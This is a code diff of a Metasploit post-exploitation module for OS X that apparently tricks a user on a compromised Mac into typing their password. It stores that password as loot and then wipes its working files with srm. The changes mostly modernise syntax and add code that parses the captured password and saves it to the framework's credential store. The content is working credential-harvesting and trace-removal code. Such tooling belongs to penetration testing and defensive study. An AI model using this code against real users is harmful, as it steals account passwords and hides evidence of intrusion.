@@ -1,10 +1,7 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
-
-require 'msf/core'
-require 'rex'
 
 class MetasploitModule < Msf::Post
   include Msf::Post::File
@@ -55,7 +52,7 @@ class MetasploitModule < Msf::Post
         ]
       ),
       OptInt.new('TIMEOUT', [true, 'Timeout for user to enter credentials', 60])
-    ], self.class)
+    ])
   end
 
 #  def cmd_exec(str, args)
@@ -109,11 +106,24 @@ class MetasploitModule < Msf::Post
       print_good("password file contents: #{password_data}")
       passf = store_loot("password", "text/plain", session, password_data, "passwd.pwd", "OSX Password")
       print_good("Password data stored as loot in: #{passf}")
+      pwd = password_data.split(':', 3)
+      pwd.shift() # date
+      pwd.shift() # username
+      create_credential({
+        workspace_id: myworkspace_id,
+        post_reference_name: self.refname,
+        private_data: pwd,
+        origin_type: :session,
+        session_id: session_db_id,
+        private_type: :password,
+        username: username
+        }
+      )
     else
       print_status("Timeout period expired before credentials were entered!")
     end
 
-    print_status("Cleaning up files in #{host}:#{dir}")
+    print_status("Cleaning up files in #{host}: #{dir}")
     cmd_exec("/usr/bin/srm -rf #{dir}")
   end
 
